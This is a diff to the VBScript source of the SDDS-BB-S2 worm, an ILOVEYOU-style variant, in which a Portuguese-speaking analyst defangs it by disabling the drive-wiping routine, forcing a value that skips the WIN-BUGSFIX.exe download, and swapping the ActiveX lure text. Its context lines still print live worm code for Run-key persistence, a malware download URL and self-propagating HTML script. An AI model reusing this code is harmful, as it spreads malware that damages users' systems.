@@ -77,7 +77,10 @@ Sub main()
   regruns()
   html()
   spreadtoemail()
-  listadriv()
+
+  rem Como não desejo fazer com que o worm SDDS-BB-S2 crie perdas nos dados dos usuários,
+  rem  simplesmente não vou permitir que a subrotina abaixo seja executada.
+  rem listadriv()
 End Sub
 
 rem Esta subrotina cria e edita valores de registros, referenciada
@@ -112,8 +115,11 @@ Sub regruns()
 
     rem Gera um número aleatório de 1 a 4, cada um associado a um link de download diferente
     rem  para o malware WIN-BUGSFIX.exe, aparentemente.
+    rem Mas como não quero baixar este malware, vou simplesmente modificar o valor do número
+    rem aleatório, que nunca vai ser nenhuma das opções abaixo.
     Randomize
-    num = Int((4 * Rnd) + 1)
+    rem num = Int((4 * Rnd) + 1)
+    num = 5
     If num = 1 Then
       regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
     ElseIf num = 2 Then
@@ -378,7 +384,7 @@ Sub html
   rem caracteres necessários para criar o documento HTML da forma apropriada.
   dta1 = "<html>"
     & vbcrlf & _ "<head>"
-    & vbcrlf & _ "<title>SDDSBBS2 - HTML<?-?title>"
+    & vbcrlf & _ "<title>OIIII BBBB :3<?-?title>"
     & vbcrlf & _ "<meta name=@-@Generator@-@ content=@-@BAROK VBS - SDDSBBS2@-@>"
     & vbcrlf & _ "<meta name=@-@Author@-@ content=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"
     & vbcrlf & _ "<meta name=@-@Description@-@ content=@-@simple but i think this is good...@-@>"
@@ -386,8 +392,8 @@ Sub html
     & vbcrlf & _ "<body ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ "
     & vbcrlf & _ "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"
     & vbcrlf & _ "<CENTER>"
-    & vbcrlf & _ "<p>This HTML file need ActiveX Control<?-?p>"
-    & vbcrlf & _ "<p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"
+    & vbcrlf & _ "<p>Eu senti saudades<?-?p>"
+    & vbcrlf & _ "<iframe src=@-@https:?-??-?giphy.com?-?embed?-?MDJ9IbxxvDUQM@-@ width=@-@480@-@ height=@-@269@-@ frameBorder=@-@0@-@><?-?iframe>"
     & vbcrlf & _ "<?-?CENTER>"
     & vbcrlf & _ "<MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE>"
     & vbcrlf & _ "<?-?body>"
@@ -404,6 +410,9 @@ Sub html
     & vbcrlf & _ "aw=1"
     & vbcrlf & _ "code="
 
+  rem O conteúdo abaixo é o código Visual Basic Script que vem junto da página HTML, tanto que
+  rem  a tag de fechamento "</script>" que foi aberta acima só é fechada abaixo. Nada deste
+  rem script vai ser executado, contudo, pois tags de comentários <!-- --> foram declaradas.
   dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"
     & vbcrlf & _ "Set dirsystem=fso.GetSpecialFolder(1)"
     & vbcrlf & _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"
@@ -424,10 +433,11 @@ Sub html
     & vbcrlf & _ "Set regedit = CreateObject(@-@WScript.Shell@-@)"
     & vbcrlf & _ "regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"
     & vbcrlf & _ "?-??-?-->"
-    & vbcrlf & _ "<?-?SCRIPT>"
+    & vbcrlf & _ "<?-?script>"
 
   rem Substituindo caracteres inválidos por caracteres ASCII válidos
   rem  para serem exibidos em um navegador web por um encoding apropriado.
+  rem Só acho confuso a numeração e a escolha de nome de variáveis de Guzman.
   dt1 = replace(dta1, chr(35) & chr(45) & chr(35), "'")
   dt1 = replace(dt1, chr(64) & chr(45) & chr(64), """")
   dt4 = replace(dt1, chr(63) & chr(45) & chr(63), "/")
@@ -445,7 +455,7 @@ Sub html
   lines = Split(c.ReadAll,vbcrlf)
   l1 = ubound(lines)
 
-  rem Codifica todos os caracteres especiais do script HTML
+  rem Codifica todos os caracteres especiais do script HTML.
   For n = 0 to ubound(lines)
     lines(n) = replace(lines(n), "'", chr(91) + chr(45) + chr(91))
     lines(n) = replace(lines(n), """", chr(93) + chr(45) + chr(93))
